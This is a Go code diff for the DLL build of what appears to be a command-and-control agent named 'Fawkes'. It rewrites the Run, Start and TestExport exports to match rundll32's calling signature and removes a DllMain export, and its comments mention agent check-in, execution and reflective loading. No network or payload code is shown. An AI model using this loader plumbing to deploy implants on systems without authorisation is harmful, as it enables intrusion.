@@ -10,10 +10,10 @@ import (
 	"os"
 	"path/filepath"
 	"time"
+	"unsafe"
 )
 
 // These exported functions are only compiled when building with -buildmode=c-shared
-// They all call the main agent logic which handles initialization, checkin, and execution
 
 func setupDllLogging() {
 	// Create log file in temp directory for DLL debugging
@@ -23,46 +23,43 @@ func setupDllLogging() {
 	if err == nil {
 		log.SetOutput(logFile)
 		log.Printf("[INFO] DLL logging initialized: %s", logPath)
+	} else {
+		// Fallback to stdout
+		log.SetOutput(os.Stdout)
 	}
 }
 
+//export TestExport
+func TestExport(hwnd, hinst, lpszCmdLine unsafe.Pointer, nCmdShow int) {
+	// Simple test export that just writes to a file to verify DLL loading
+	// This matches rundll32's expected signature
+	tempDir := os.TempDir()
+	testPath := filepath.Join(tempDir, "fawkes_test.txt")
+	content := fmt.Sprintf("Fawkes DLL TestExport called at %s\n", time.Now().String())
+	os.WriteFile(testPath, []byte(content), 0644)
+}
+
 //export Run
-func Run() {
-	// Entry point for the DLL that can be called via rundll32 or reflective loading
+func Run(hwnd, hinst, lpszCmdLine unsafe.Pointer, nCmdShow int) {
+	// Entry point for the DLL that can be called via rundll32
+	// Matches rundll32's expected signature: void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
 	setupDllLogging()
 	log.Printf("[INFO] DLL Run export called")
 	runAgent()
 }
 
 //export Start
-func Start() {
+func Start(hwnd, hinst, lpszCmdLine unsafe.Pointer, nCmdShow int) {
 	// Alternative entry point name
 	setupDllLogging()
 	log.Printf("[INFO] DLL Start export called")
 	runAgent()
 }
 
-//export DllMain
-func DllMain() {
-	// Windows DLL entry point that gets called on DLL_PROCESS_ATTACH
-	// Note: This may have limitations with Go runtime initialization
-	setupDllLogging()
-	log.Printf("[INFO] DLL DllMain export called")
-	runAgent()
-}
-
 //export VoidFunc
 func VoidFunc() {
-	// Generic export that some loaders expect
+	// Generic export for some loaders that don't use rundll32 signature
 	setupDllLogging()
 	log.Printf("[INFO] DLL VoidFunc export called")
 	runAgent()
-}
-
-//export TestExport
-func TestExport() {
-	// Simple test export that just writes to a file to verify DLL loading
-	tempDir := os.TempDir()
-	testPath := filepath.Join(tempDir, "fawkes_test.txt")
-	os.WriteFile(testPath, []byte(fmt.Sprintf("Fawkes DLL loaded successfully at %s\n", time.Now().String())), 0644)
 }
